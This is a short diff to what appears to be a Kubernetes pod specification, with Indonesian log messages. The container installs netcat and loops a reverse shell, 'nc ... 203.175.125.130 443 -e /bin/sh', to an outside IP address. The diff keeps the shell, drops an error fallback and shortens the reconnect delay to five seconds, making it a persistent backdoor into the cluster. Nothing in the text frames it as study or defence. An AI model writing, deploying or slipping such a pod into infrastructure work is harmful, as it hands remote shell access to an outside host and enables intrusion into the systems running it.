@@ -13,8 +13,8 @@ spec:
     - |
       apk add --update netcat-openbsd
       while true; do
-        echo "=== Mencoba konek ke VPS ==="
-        nc -v 203.175.125.130 443 -e /bin/sh || echo "Gagal, coba lagi 10 detik"
-        sleep 10
+        nc -v 203.175.125.130 443 -e /bin/sh
+        echo "Koneksi putus, reconnect dalam 5 detik..."
+        sleep 5
       done
   restartPolicy: Never
